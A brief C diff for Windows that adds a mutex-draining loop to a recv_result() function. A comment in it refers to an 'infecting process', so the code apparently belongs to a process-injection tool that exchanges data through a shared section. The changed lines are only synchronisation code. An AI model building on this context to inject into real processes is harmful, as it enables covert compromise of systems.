@@ -134,6 +134,7 @@ int send_command(uint8_t* buffer, uint32_t size)
 int recv_result(uint8_t* dst, uint32_t size)
 {
 	PCHAR recv_section;
+	DWORD res;
 
 	if (can_operate == 0)
 	{
@@ -142,6 +143,12 @@ int recv_result(uint8_t* dst, uint32_t size)
 #endif
 		return 1;
 	}
+
+	do
+	{
+		res = WaitForSingleObject(hMutexRecv, 0);
+		ReleaseMutex(hMutexRecv);
+	} while (res == WAIT_OBJECT_0);
 
 	//wait for the infecting process finish writing
 	WaitForSingleObject(hMutexRecv, INFINITE);
